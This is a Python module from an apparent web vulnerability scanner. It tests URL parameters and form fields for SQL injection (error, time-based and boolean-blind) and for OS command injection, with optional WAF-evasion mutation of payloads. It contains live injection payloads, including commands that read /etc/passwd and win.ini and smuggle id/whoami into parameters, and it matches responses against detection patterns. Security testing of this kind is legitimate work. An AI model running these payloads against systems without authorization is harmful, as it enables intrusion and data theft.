import time
import logging
import random
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

from websecure.scanners.base import BaseScanner
from websecure.core.mutator import Mutator
from websecure.core.reporting import add_result

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# OS Command Injection payloads and detection patterns
# ---------------------------------------------------------------------------
_CMDI_PAYLOADS: List[Tuple[str, str]] = [
    # (payload, technique)
    ("; echo CMDI_UNIX_$(id)",            "unix_echo"),
    ("| echo CMDI_UNIX_$(id)",            "unix_pipe"),
    ("`echo CMDI_UNIX_$(whoami)`",        "unix_backtick"),
    ("$(echo CMDI_UNIX_$(id))",           "unix_subshell"),
    ("' ; echo CMDI_UNIX_$(id) #",        "unix_quote_escape"),
    ("\" ; echo CMDI_UNIX_$(id) #",       "unix_dquote_escape"),
    ("& echo CMDI_WIN_%USERNAME%",        "windows_amp"),
    ("| echo CMDI_WIN_%COMPUTERNAME%",    "windows_pipe"),
    ("; sleep 5",                         "unix_time"),
    ("| sleep 5",                         "unix_time_pipe"),
    ("& timeout /T 5 /NOBREAK",           "windows_time"),
    ("; cat /etc/passwd",                 "unix_file_read"),
    ("| cat /etc/passwd",                 "unix_file_read_pipe"),
    ("& type C:\\Windows\\win.ini",       "windows_file_read"),
]

_CMDI_SUCCESS_PATTERNS: List[Tuple[str, str]] = [
    (r"uid=\d+\(.*?\)\s+gid=\d+",         "Unix id output — command execution confirmed"),
    (r"root:.*:0:0:",                       "/etc/passwd read — LFI/CMDI confirmed"),
    (r"CMDI_UNIX_",                         "Echo marker reflected — command injection confirmed"),
    (r"\[extensions\].*for 16\-bit app",   "Windows win.ini read — CMDI confirmed"),
    (r"CMDI_WIN_\S+",                       "Windows env variable reflected — CMDI confirmed"),
    (r"(?i)(cannot run program|execvp|/bin/sh|cmd\.exe)", "Shell execution error leak"),
]


class SQLInjectionScanner(BaseScanner):
    """
    Robust SQL Injection Scanner.
    Features:
    - Error-based detection with baseline comparison (no false positives)
    - Boolean-based blind detection (content length/hash comparison)
    - Time-based blind detection with dynamic threshold (baseline + delta)
    - WAF Evasion integration via Mutator
    - Parallel payload testing via ThreadPoolExecutor
    """

    name = "sqli"
    phase = "offensive"

    # Configurable limits
    MAX_WORKERS = 5          # parallel threads for payload testing
    TIME_DELTA = 3.0         # seconds above baseline to flag time-based
    MAX_FORM_PAYLOADS = 12   # payload cap per form input

    # Signatures for Error-Based SQLi
    ERRORS = {
        "MySQL": (
            r"SQL syntax.*MySQL", r"Warning.*mysql_.*",
            r"valid MySQL result", r"MySqlClient\.",
        ),
        "PostgreSQL": (
            r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result", r"Npgsql\.",
        ),
        "Microsoft SQL Server": (
            r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server",
            r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
        ),
        "Microsoft Access": (
            r"Microsoft Access Driver", r"JET Database Engine",
            r"Access Database Engine",
        ),
        "Oracle": (
            r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error",
            r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*",
        ),
        "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
        "SQLite": (
            r"SQLite/JDBCDriver", r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]",
        ),
        "Sybase": (
            r"(?i)Sybase message", r"Sybase.*Server message",
            r"SybSQLException",
        ),
    }

    def __init__(self, session=None, results=None, debug=False):
        super().__init__(session, results, debug)
        self.payloads = self._load_payloads()

    def _load_payloads(self) -> List[str]:
        """Loads SQLi payloads. Falls back to built-in list if wordlist unavailable."""
        try:
            from websecure.core.payloads import get_payloads
            loaded = get_payloads("sqli")
            if loaded:
                return loaded
        except Exception:
            pass
        return [
            "'", '"', "')", '");',
            "' OR '1'='1", '" OR "1"="1',
            "' OR 1=1--", '" OR 1=1--',
            "' UNION SELECT 1,2,3--", '" UNION SELECT 1,2,3--',
            "' AND 1=0 UNION SELECT 1,version()--",
            "'; WAITFOR DELAY '0:0:5'--",   # MSSQL time-based
            "'; SELECT SLEEP(5)--",          # MySQL time-based
            "' || pg_sleep(5)--",            # PostgreSQL time-based
        ]

    def _extract_error_fingerprints(self, text: str) -> set:
        """Returns the set of (db, regex) pairs matching the given text."""
        found = set()
        for db, regexes in self.ERRORS.items():
            for r in regexes:
                if re.search(r, text, re.I):
                    found.add((db, r))
        return found

    def _is_time_payload(self, payload: str) -> bool:
        p = payload.upper()
        return any(kw in p for kw in ("SLEEP", "WAITFOR", "PG_SLEEP"))

    # Boolean-blind payloads: (true_payload, false_payload)
    _BOOL_PAIRS: List[Tuple[str, str]] = [
        ("' AND 1=1--",   "' AND 1=2--"),
        ("' AND 'a'='a",  "' AND 'a'='b"),
        ("\" AND 1=1--",  "\" AND 1=2--"),
        ("1 AND 1=1",     "1 AND 1=2"),
        ("' OR 1=1--",    "' OR 1=2--"),
    ]
    _BOOL_DIFF_THRESHOLD = 0.12  # 12% content-length change flags as vuln

    def _is_boolean_blind(self, url: str, param: str,
                          baseline_len: int) -> Optional[Tuple[str, str]]:
        """Compare TRUE vs FALSE condition response lengths. Returns (payload, evidence) if vuln."""
        for true_pl, false_pl in self._BOOL_PAIRS:
            try:
                true_url  = self._inject_param(url, param, true_pl)
                false_url = self._inject_param(url, param, false_pl)
                r_true  = self.session.get(true_url,  timeout=10)
                r_false = self.session.get(false_url, timeout=10)
                len_true  = len(r_true.text)
                len_false = len(r_false.text)
                # Must differ from each other but true should resemble baseline
                diff_tf = abs(len_true - len_false)
                if baseline_len > 0 and diff_tf / max(baseline_len, 1) >= self._BOOL_DIFF_THRESHOLD:
                    evidence = (
                        f"Boolean-blind: TRUE response={len_true}B "
                        f"FALSE response={len_false}B diff={diff_tf}B "
                        f"({diff_tf/max(baseline_len,1)*100:.1f}% change)"
                    )
                    return true_pl, evidence
            except Exception:
                continue
        return None

    def run(self, url, **kwargs):
        urls = url if isinstance(url, list) else [url]
        for u in urls:
            self.scan_url(u)
            self.scan_cmdi_url(u)

        pages_with_forms = self.results.get("forms_meta", [])
        if pages_with_forms:
            all_forms = []
            for page in pages_with_forms:
                if "forms" in page:
                    all_forms.extend(page["forms"])
            if all_forms:
                self.scan_forms(all_forms)

    def scan_url(self, url: str):
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        if not params:
            return

        logger.info(f"[SQLi] Scanning URL params: {url}")

        # Establish baseline — captures response time and error fingerprint
        try:
            t0 = time.time()
            baseline = self.session.get(url, timeout=10)
            baseline_time = time.time() - t0
            baseline_errors = self._extract_error_fingerprints(baseline.text)
        except Exception:
            return

        time_threshold = baseline_time + self.TIME_DELTA

        baseline_len = len(baseline.text) if baseline.text else 0

        for param_name, _ in params:
            found = self._test_param_parallel(
                url, param_name, baseline_errors, time_threshold
            )
            if found:
                break  # one confirmed vuln per URL is sufficient

            # Boolean-blind fallback (runs only if error/time checks found nothing)
            bool_result = self._is_boolean_blind(url, param_name, baseline_len)
            if bool_result:
                payload, evidence = bool_result
                self._report_vuln("SQL Injection (Boolean-Blind)", url, param_name, payload, evidence)
                break

    def _test_param_parallel(
        self,
        url: str,
        param_name: str,
        baseline_errors: set,
        time_threshold: float,
    ) -> bool:
        """Tests all payloads for one parameter using a thread pool. Returns True if vuln found."""
        def probe(payload: str):
            # Optionally mutate for WAF evasion
            if random.random() < 0.3:
                mutated = Mutator.mutate_sql(payload)
                curr = random.choice(mutated) if mutated else payload
            else:
                curr = payload

            injected = self._inject_param(url, param_name, curr)
            t0 = time.time()
            try:
                res = self.session.get(injected, timeout=12)
                elapsed = time.time() - t0
            except Exception:
                return None

            # Error-based: only flag NEW errors not seen in baseline
            new_errors = self._extract_error_fingerprints(res.text) - baseline_errors
            if new_errors:
                db = next(iter(new_errors))[0]
                return ("SQL Injection (Error)", url, param_name, curr,
                        f"DB: {db} — new error signature in response")

            # Time-based
            if self._is_time_payload(curr) and elapsed > time_threshold:
                return ("SQL Injection (Time-Based)", url, param_name, curr,
                        f"Response {elapsed:.2f}s > threshold {time_threshold:.2f}s")

            return None

        with ThreadPoolExecutor(max_workers=self.MAX_WORKERS) as exe:
            futures = {exe.submit(probe, p): p for p in self.payloads}
            for fut in as_completed(futures):
                result = fut.result()
                if result:
                    self._report_vuln(*result)
                    # Cancel remaining futures
                    for f in futures:
                        f.cancel()
                    return True
        return False

    def scan_forms(self, forms: List[Dict]):
        logger.info(f"[SQLi] Scanning {len(forms)} forms...")
        for form in forms:
            action = form.get("action")
            method = (form.get("method") or "GET").upper()
            inputs = form.get("inputs", [])
            if not action or not inputs:
                continue

            skipped = {"submit", "button", "image", "reset", "file", "checkbox", "radio"}
            fuzzable = [i for i in inputs if i.get("type", "text") not in skipped]

            # Establish form baseline for error comparison
            baseline_errors: set = set()
            baseline_time = 0.0
            try:
                base_data = {i.get("name"): i.get("value", "") for i in inputs if i.get("name")}
                t0 = time.time()
                if method == "POST":
                    br = self.session.post(action, data=base_data, timeout=10)
                else:
                    br = self.session.get(action, params=base_data, timeout=10)
                baseline_time = time.time() - t0
                baseline_errors = self._extract_error_fingerprints(br.text)
            except Exception:
                pass

            time_threshold = baseline_time + self.TIME_DELTA
            payloads = self.payloads[:self.MAX_FORM_PAYLOADS]

            for inp in fuzzable:
                p_name = inp.get("name")
                if not p_name:
                    continue

                found = self._test_form_param_parallel(
                    action, method, inputs, p_name, payloads,
                    baseline_errors, time_threshold
                )
                if found:
                    break

    def _test_form_param_parallel(
        self,
        action: str,
        method: str,
        inputs: List[Dict],
        p_name: str,
        payloads: List[str],
        baseline_errors: set,
        time_threshold: float,
    ) -> bool:
        base_data = {i.get("name"): i.get("value", "") for i in inputs if i.get("name")}

        def probe(payload: str):
            form_data = dict(base_data)
            form_data[p_name] = payload
            t0 = time.time()
            try:
                if method == "POST":
                    res = self.session.post(action, data=form_data, timeout=12)
                else:
                    res = self.session.get(action, params=form_data, timeout=12)
                elapsed = time.time() - t0
            except Exception:
                return None

            new_errors = self._extract_error_fingerprints(res.text) - baseline_errors
            if new_errors:
                db = next(iter(new_errors))[0]
                return ("SQLi (Form/Error)", action, p_name, payload, f"DB: {db}")

            if self._is_time_payload(payload) and elapsed > time_threshold:
                return ("SQLi (Form/Time)", action, p_name, payload,
                        f"Response {elapsed:.2f}s > threshold {time_threshold:.2f}s")

            return None

        with ThreadPoolExecutor(max_workers=self.MAX_WORKERS) as exe:
            futures = {exe.submit(probe, p): p for p in payloads}
            for fut in as_completed(futures):
                result = fut.result()
                if result:
                    self._report_vuln(*result)
                    for f in futures:
                        f.cancel()
                    return True
        return False

    def _inject_param(self, url: str, key: str, val: str) -> str:
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        params[key] = val
        new_query = urlencode(params)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                           parsed.params, new_query, parsed.fragment))

    # -------------------------------------------------------------------------
    # OS Command Injection
    # -------------------------------------------------------------------------

    def scan_cmdi_url(self, url: str):
        """Test URL parameters for OS command injection (error + time-based)."""
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        if not params:
            return

        logger.info(f"[CMDI] Scanning URL params: {url}")

        try:
            t0 = time.time()
            baseline = self.session.get(url, timeout=10)
            baseline_time = time.time() - t0
            baseline_text = baseline.text or ""
        except Exception:
            return

        time_threshold = baseline_time + self.TIME_DELTA

        for param_name, _ in params:
            if self._test_cmdi_param(url, params, param_name, baseline_text, time_threshold):
                break

    def _test_cmdi_param(
        self, url: str, qs: list, param_name: str,
        baseline_text: str, time_threshold: float,
    ) -> bool:
        parsed = urlparse(url)

        def probe(payload: str, technique: str):
            new_qs = [(p, v + payload if p == param_name else v) for p, v in qs]
            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
            t0 = time.time()
            try:
                resp = self.session.get(t_url, timeout=12)
                elapsed = time.time() - t0
            except Exception:
                return None

            atk_text = resp.text or ""

            # Error/reflection-based
            for pattern, description in _CMDI_SUCCESS_PATTERNS:
                if re.search(pattern, atk_text, re.I | re.S):
                    if not re.search(pattern, baseline_text, re.I | re.S):
                        return ("OS Command Injection", url, param_name, payload,
                                f"{description} (technique: {technique})")

            # Time-based (blind)
            if "time" in technique and elapsed > time_threshold:
                return ("OS Command Injection (Time-Based)", url, param_name, payload,
                        f"Response {elapsed:.2f}s > threshold {time_threshold:.2f}s")

            return None

        with ThreadPoolExecutor(max_workers=self.MAX_WORKERS) as exe:
            futures = {exe.submit(probe, p, t): (p, t) for p, t in _CMDI_PAYLOADS}
            for fut in as_completed(futures):
                result = fut.result()
                if result:
                    self._report_vuln(*result)
                    for f in futures:
                        f.cancel()
                    return True
        return False

    def _report_vuln(self, title: str, url: str, param: str, payload: str, info: str):
        add_result("offensive", {
            "type": title,
            "severity": "Critical",
            "url": url,
            "parameter": param,
            "payload": payload,
            "info": info,
        })
        logger.warning(f"[SQLi/CMDI] {title} FOUND: {url} (param={param})")


def run(url, session=None, results=None, debug=False, **kwargs):
    scanner = SQLInjectionScanner(session, results, debug)
    scanner.run(url)
